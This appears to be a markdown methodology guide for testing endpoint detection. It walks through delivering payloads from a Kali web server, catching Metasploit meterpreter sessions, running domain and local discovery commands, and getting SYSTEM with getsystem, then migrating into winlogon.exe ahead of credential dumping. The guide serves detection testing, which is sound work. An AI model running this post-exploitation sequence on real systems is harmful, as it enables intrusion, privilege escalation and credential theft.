# Phase 1 Testing

## Payload Delivery

Start this test by starting a web server using python in the same directory your 3 payloads exist on you're Kali system.

```
python3 -m http.server
```

On target machine download the three payloads, record if any alerts fire for this activity. 
You may also try different browsers as that can result in different checks and hooks used by the endpoint software.

If all files are blocked you can either allow the downloads manaually in the security stack or conclude the test.


## Execution

Start you MSF listener on your attacker host. The msf.rc is a configuration file for Metasploit, you can take the contents or download this [file](https://github.com/blumirabrian/endpoint-detection-methology/blob/main/msf/msf.rc), make sure to update the SSL to the certificate you created in the [initial setup phase](https://github.com/blumirabrian/endpoint-detection-methology/blob/main/msf/MSF-Setup.md#inital-setup-for-msf-testing) and change the LHOST IP to the IP on you Kali machine.

```
sudo msfconsole -r msf.rc
```

Run the three test files from 1 to 3 by simply double clicking, and record the detection results. It is recommended to right click and run at least one of the payloads as Administrator to facilitate later testing for privesc.

## Discovery

The rests of the tests will be ran from out created meterpreter sessions.

First let's run systeminfo on the system:
(session -i start an interactive sessions where N is the number of the meterpreter session your host has established.)
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell


systeminfo
```

The second discover task is to look for connected domain trusts and administrative accounts.

*Execute these commands using a shell that is not SYSTEM but a domain user account*
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell

net group "enterprise admins" /domain
net group "domain admins" /domain
```

The third discovery task will look for local accounts and groups.

```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell

whoami /groups
net view /all
```

## Local Privilege Escalation

The fourth group of tasks starts with becoming SYSTEM run the following in your meterpreter session:
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > getsystem 
```

After becoming system target a process to inject into, a good recommendation is winlogon.exe as it keeps SYSTEM priv and will stay active as well as make sure you are running a compatible architechure for dumping credentials later.
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

(List Processes with ps)

meterpreter > ps
```
Pick a process that has SYSTEM and is x64

```
Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----

812   708   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
```

(Example winlogon.exe)

Run migrate with process id of target
```
meterpreter > migrate 812
[*] Migrating from 7236 to 812...
[*] Migration completed successfully.
```

